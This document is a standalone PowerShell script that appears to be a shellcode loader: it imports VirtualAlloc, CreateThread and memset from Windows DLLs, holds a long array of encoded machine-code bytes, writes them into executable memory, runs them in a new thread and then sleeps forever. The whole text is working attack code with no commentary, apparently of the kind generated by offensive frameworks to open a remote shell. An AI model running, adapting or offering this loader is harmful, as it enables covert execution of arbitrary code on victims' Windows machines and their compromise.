$bxX = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $bxX -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0xa7,0xbb,0x26,0x99,0xd9,0xc1,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x6a,0x0f,0x03,0x6a,0xa8,0x59,0xd3,0x65,0x5e,0x1f,0x1c,0x96,0x9e,0x40,0x94,0x73,0xaf,0x40,0xc2,0xf0,0x9f,0x70,0x80,0x55,0x13,0xfa,0xc4,0x4d,0xa0,0x8e,0xc0,0x62,0x01,0x24,0x37,0x4c,0x92,0x15,0x0b,0xcf,0x10,0x64,0x58,0x2f,0x29,0xa7,0xad,0x2e,0x6e,0xda,0x5c,0x62,0x27,0x90,0xf3,0x93,0x4c,0xec,0xcf,0x18,0x1e,0xe0,0x57,0xfc,0xd6,0x03,0x79,0x53,0x6d,0x5a,0x59,0x55,0xa2,0xd6,0xd0,0x4d,0xa7,0xd3,0xab,0xe6,0x13,0xaf,0x2d,0x2f,0x6a,0x50,0x81,0x0e,0x43,0xa3,0xdb,0x57,0x63,0x5c,0xae,0xa1,0x90,0xe1,0xa9,0x75,0xeb,0x3d,0x3f,0x6e,0x4b,0xb5,0xe7,0x4a,0x6a,0x1a,0x71,0x18,0x60,0xd7,0xf5,0x46,0x64,0xe6,0xda,0xfc,0x90,0x63,0xdd,0xd2,0x11,0x37,0xfa,0xf6,0x7a,0xe3,0x63,0xae,0x26,0x42,0x9b,0xb0,0x89,0x3b,0x39,0xba,0x27,0x2f,0x30,0xe1,0x2f,0x9c,0x79,0x1a,0xaf,0x8a,0x0a,0x69,0x9d,0x15,0xa1,0xe5,0xad,0xde,0x6f,0xf1,0xd2,0xf4,0xc8,0x6d,0x2d,0xf7,0x28,0xa7,0xe9,0xa3,0x78,0xdf,0xd8,0xcb,0x12,0x1f,0xe5,0x19,0x8e,0x1a,0x71,0x62,0xe7,0x24,0x89,0x0a,0xfa,0x26,0x98,0x96,0x73,0xc0,0xca,0x76,0xd4,0x5d,0xaa,0x26,0x94,0x0d,0x42,0x2d,0x1b,0x71,0x72,0x4e,0xf1,0x1a,0x18,0xa1,0xac,0x73,0xb4,0x58,0xf5,0x08,0x25,0xa4,0x23,0x75,0x65,0x2e,0xc0,0x89,0x2b,0xc7,0xad,0x99,0xdb,0x27,0xf8,0xc0,0x4d,0x37,0xd6,0x6f,0x71,0xad,0xdd,0x39,0x26,0x59,0xdc,0x1c,0x00,0xc6,0x1f,0x4b,0x1b,0xcf,0xb5,0x34,0x73,0x30,0x5a,0xb5,0x83,0x66,0x30,0xb5,0xeb,0xde,0x60,0xe6,0x0e,0x21,0xbd,0x9a,0x83,0xb4,0x3e,0xcb,0x70,0x1e,0x57,0xf1,0xaf,0x68,0xf8,0x0a,0x9a,0x68,0xc4,0xdc,0xe2,0x1e,0x24,0xdd;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$MRu=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($MRu.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$MRu,0,0,0);for (;;){Start-sleep 60};